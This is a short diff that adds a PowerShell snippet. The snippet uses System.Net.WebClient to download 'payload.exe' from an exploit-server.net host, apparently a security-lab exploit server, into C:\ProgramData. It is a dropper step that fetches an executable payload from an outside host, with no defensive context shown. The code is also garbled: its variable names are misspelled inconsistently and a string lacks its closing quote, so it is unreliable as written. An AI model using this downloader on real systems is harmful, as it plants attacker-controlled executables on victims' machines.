@@ -1,0 +1,4 @@
+$webclinet = New-Object System.Net.WebClient
+$payloda_url = "https://exploit-0a40008703a7e10f815c8dfe019a0061.exploit-server.net/payload.exe"
+$file = "c:\ProgramData\paylaod.exe
+$webclient.DownloadFile($payload_url,$file)
